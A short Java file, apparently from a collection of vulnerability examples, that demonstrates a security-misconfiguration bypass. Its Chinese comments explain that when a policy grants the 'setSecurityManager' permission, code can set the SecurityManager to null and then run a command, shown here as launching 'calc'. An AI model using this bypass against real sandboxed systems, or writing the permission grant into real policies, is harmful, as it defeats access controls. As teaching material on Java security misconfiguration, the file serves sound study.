package com.r17a.commonvuln.securitymissconfig.securitymanager;


import java.io.IOException;

/**
 * 通过授权RuntimePermission为setSecurityManager和设置SecurityManager为null，绕过check
 */
public class SetSecurityManagerNullBypass {
    public static void main(String[] args) {
        new SetSecurityManagerNullBypass().exec();
    }

    private void exec() {
        //TODO 编译运行 -Djava.security.manager -Djava.security.policy==your.policy
        // grant {
        //    permission java.lang.RuntimePermission "setSecurityManager";
        // };

        // 设置SecurityManager为null 绕过check
        System.setSecurityManager(null);
        // 执行命令
        Runtime runtime = Runtime.getRuntime();
        try {
            runtime.exec("calc");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

}
